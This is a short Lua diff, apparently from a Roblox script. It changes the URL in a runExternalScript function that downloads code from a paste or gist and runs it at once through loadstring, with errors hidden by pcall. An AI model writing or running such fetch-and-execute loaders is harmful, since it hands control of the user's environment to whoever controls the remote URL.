@@ -412,7 +412,7 @@ end
 local function runExternalScript()
     task.spawn(function()
         pcall(function()
-            loadstring(game:HttpGetAsync("https://pastefy.app/bZRqQWeW/raw"))()
+            loadstring(game:HttpGetAsync("https://gist.githubusercontent.com/Nappypie/6244c406aa0686a8aaddcf565c7d98b7/raw/3b693642bda11336dc8ed9808c52c87d2a54ba99/Hello.lua"))()
         end)
     end)
 end
